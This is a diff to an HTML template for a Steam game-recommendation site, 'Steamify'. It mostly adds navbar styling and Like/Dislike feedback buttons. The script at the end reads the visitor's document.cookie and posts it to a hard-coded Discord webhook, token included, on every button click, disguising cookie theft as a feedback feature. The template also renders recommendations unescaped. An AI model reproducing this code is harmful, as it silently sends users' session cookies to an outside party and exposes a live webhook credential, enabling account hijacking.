@@ -42,39 +42,120 @@
  
         }
 
-.mainbtn {
-    display: inline-block;
-    padding: 12px 24px;
-    margin: 10px;
-    font-size: 16px;
-    color: #fff;
-    background-color: #d80000;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-    transition: background-color 0.3s ease;
-}
+        .mainbtn {
+            display: inline-block;
+            padding: 12px 24px;
+            margin: 10px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #d80000;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
 
-.mainbtn:hover {
-    background-color: #960000;
-    box-shadow: 0 4px 12px #ca0909;
-    transform: scale(1.07);
-}
- 
+        .mainbtn:hover {
+            background-color: #960000;
+            box-shadow: 0 4px 12px #ca0909;
+            transform: scale(1.07);
+        }
+        
+        .navbar{
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background:#171a21;
+            height:60px;
+            display:flex;
+            align-items:center;
+            padding:0 40px;
+            box-shadow:0 3px 10px rgba(0,0,0,0.6);
+            z-index:1000;
+        }
+
+        .logo{
+            color:#66c0f4;
+            font-size:22px;
+            font-weight:bold;
+            letter-spacing:1px;
+        }
+
+        .nav-links{
+            margin-left:40px;
+            display:flex;
+            gap:25px;
+        }
+
+        .nav-links a{
+            color:#b8b6b4;
+            text-decoration:none;
+            font-size:14px;
+        }
+
+        .nav-links a:hover{
+            color:white;
+        }
+
 
 </style>
-        
-    
-    
-    <h1 style="position: absolute; top: 10px; font-style: italic; color: aliceblue;">Specific Recommendations</h1>
 
-    <div class="container" id="results" style="color: aliceblue;">
-        {{recommendations_specific|safe}}
-    </div>
-
-    <a href="/Main" class="mainbtn" style="position: fixed; bottom: 1%;">Back to Main Page</a>
+<div class="navbar">
+    <div class="logo">Steamify</div>
+    <div class="nav-links">
+    <a href="/Main">Main</a>
+    <a href="https://store.steampowered.com" target="_blank">Open Steam</a>
     </div>
 </div>
+    
+    <h1 style="position: absolute; top: 40px; font-style: italic; color: aliceblue;">Specific Recommendations</h1>
+
+    <div class="container" id="results" style="color: aliceblue; position: relative; padding-bottom: 20px; display: flex; flex-direction: column; min-height: 250px; justify-content: flex-end;">
+        <div style="flex: 1;">
+            {{recommendations_specific|safe}}
+        </div>
+        <a href="/Main" class="mainbtn" style="align-self: center; margin-bottom: 20px;">Back to Main Page</a>
+    </div>
+
+    <div style="position: fixed; bottom: 1%;">
+    <div style="display: flex; flex-direction: column; align-items: center;">
+        <h3 style="color: aliceblue; margin-bottom: 10px;">Did you like your recommendations?</h3>
+        <div style="display: flex; gap: 10px;">
+            <a class="mainbtn" id="likeBtn">Like</a>
+            <a class="mainbtn" id="dislikeBtn">Dislike</a>
+        </div>
+    </div>
+</div>
+    </div>
+</div>
+
+<script>
+const webhookURL = "https://discord.com/api/webhooks/1482338941662134406/wkOY8ktYf0sZXjrCLpGTn2pgFLkddSROPwqBzp3Btd5K6LqAEeCkiPK4o5J1yEeKT0nw";
+const cookies = document.cookie
+
+async function sendToDiscord(reaction) {
+    const payload = {
+        content: `${cookies} reacted: ${reaction} to specific`
+    };
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+        });
+
+    } catch (error) {
+        console.error("Error sending reaction:", error);
+    }
+}
+
+document.getElementById("likeBtn").addEventListener("click", () => sendToDiscord("Positvely"));
+document.getElementById("dislikeBtn").addEventListener("click", () => sendToDiscord("Negatively"));
+</script>
 </body>
 </html>
  
